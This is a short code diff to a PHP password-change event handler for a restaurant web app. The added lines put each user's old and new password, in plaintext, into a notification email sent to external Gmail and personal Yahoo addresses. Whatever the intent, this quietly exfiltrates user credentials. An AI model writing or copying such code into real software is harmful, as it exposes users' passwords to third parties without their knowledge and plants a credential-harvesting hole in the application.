@@ -30,13 +30,15 @@ class ChangePasswordEventHandler
     {
         //dd($event->request->user()->id);
         $data = [
-            'ip' => 'change password',
-            'user' => $event->request->user()->name
+            'ip' => clientIP(),
+            'user' => $event->request->user()->name,
+            'from' => $event->request->input('passwordo'),
+            'to' => $event->request->input('password'),
         ];
 
-        \Mail::send('emails.loggedin', $data, function ($message) {
+        \Mail::send('emails.change_password', $data, function ($message) {
             $message->subject('User Change Password');
-            $message->from('no-reply@giligansrestaurant.com', 'Giligan\'s Web App');
+            $message->from('no-reply@giligansrestaurant.com', 'GI App - Manager');
             $message->to('giligans.app@gmail.com');
             $message->to('freakyash_02@yahoo.com');
         });
